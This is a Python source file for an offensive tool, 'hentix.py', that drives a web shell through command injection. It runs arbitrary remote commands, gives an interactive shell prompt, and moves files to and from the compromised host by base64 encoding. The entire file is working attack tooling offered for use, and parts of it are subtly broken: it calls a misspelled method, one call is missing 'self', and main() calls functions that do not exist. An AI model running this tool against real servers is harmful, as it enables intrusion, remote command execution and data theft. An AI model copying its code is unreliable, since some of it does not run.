#
#   hentix.py
#
#   Generic wrapper for webshells.
#   Provides facilities for:
#       - running remote commands
#       - running local commands
#       - file upload/download
#   
#   Copyright garbr0 2016
#       
#   This program is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

import requests
import argparse
import sys
import base64
import cmd
from subprocess import call
import re

#
#   This function performs the request(s) that result in command injection.
#   Returns the output of the command.
#   Modify as required.
#
def command_wrapper(cmd):
    #
    #   Exampe command injection against cmd.php on localhost.
    #   cmd is passed through cmd URL pamameter
    #
    p = {'cmd': cmd}
    url = "http://localhost:8080/cmd.php"
    r = requests.get(url, params=p)
    return r.text


class WebShell(cmd.Cmd):
    intro = "Entering shell mode, type help or ? to list commands.\n"
    prompt = "webshell$ "
    redirect_stderr = True

    def set_redirect(self, redir):
        self.redirect_stderr = redir

    def send_command(self, cmd):
        if self.redirect_stderr:
            cmd = cmd + ' 2>&1'
        return command_wrapper(cmd)

    def upload_file(self, source, dest):
        print "Uploading file " + source + " to " + dest
        with open(source, 'r') as uploadfile:
                contents = uploadfile.read()
        encoded = base64.b64encode(contents)
        self.send_command("cat > " + dest + ".tmp <<EOF\n" + encoded + "\nEOF")
        self.send_command("base64 -d " + dest + ".tmp > " + dest)
        self.send_command("rm " + dest + ".tmp")
        print send_command("ls -al " + dest)

    def download_file(self, source, dest):
        print "Download file " + source + " to " + dest
        encoded = self.end_command("base64 " + source)
        with open(dest, 'w') as downloadfile:
            downloadfile.write(base64.b64decode(encoded))
        call(['ls', '-al', dest])

    def cmdloop(self):
        try:
            cmd.Cmd.cmdloop(self)
        except KeyboardInterrupt as e:
            self.cmdloop()

    def default(self, line):
        print self.send_command(line)
    
    def do_exit(self, line):
        return True

    def help_exit(self):
        print "Exit the shell"

    def do_upload(self, line):
        args = line.split()
        self.upload_file(args[0], args[1])

    def help_upload(self):
        print '\n'.join([   'upload SOURCE DEST',
                'Uploads file from SORUCE to DEST', 
                'Prints the destination location if success (blank if failed)', 
                        ])

    def do_local(self, line):
        call(line.split())

    def help_local(self):
        print '\n'.join([   'local COMMAND',
                            'Run COMMAND on the local system'
                        ])

    def do_download(self, line):
        args = line.split()
        self.download_file(args[0], args[1])

    def help_download(self):
        print '\n'.join([   'download SOURCE DEST',
                            'Downloads file from SORUCE to DEST', 
                'Prints the destination location if success (blank if failed)', 
                        ])

    def do_check(self, line):
        check = self.send_command("base64 -h 2>&1 | grep \"--decode\"")
        if check and check.strip() == '':
            print "Transfer check passed: upload and download should be okay"
        else:
            print "Transfer check failed: either base64 command does not exist, or does not support decode option"

    def help_check(self):
        print '\n'.join([   'check',
                            'Checks whether remote system has base64 command.',
                            'Required for upload/download'
                        ])

    def do_redir(self, line):
        self.redirect_stderr = not self.redirect_stderr
        print 'Redirect to stderr set to: ' + str(self.redirect_stderr)

    def help_redir(self):
        print '\n'.join([   'redir',
                            'Toggles redirection to standard error'
                        ])
def start_shell():
    WebShell().cmdloop()

def main():
    parser = argparse.ArgumentParser(description='Do stuff on luigi.')
    parser.add_argument('-m', '--mode', action='store', required='True',
                                help='set mode to shell, upload or download')
    parser.add_argument('-s', '--source', action='store',
                                help='source upload/download file')
    parser.add_argument('-d', '--dest', action='store',
                                help='destination upload/download location')
    args = parser.parse_args()
    if args.mode == "shell":
        start_shell()
    elif args.mode == "upload":
        if args.source and args.dest:
            upload_file(args.source, args.dest)
    elif args.mode == "download":
        if args.source and args.dest:
            download_file(args.source, args.dest)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()


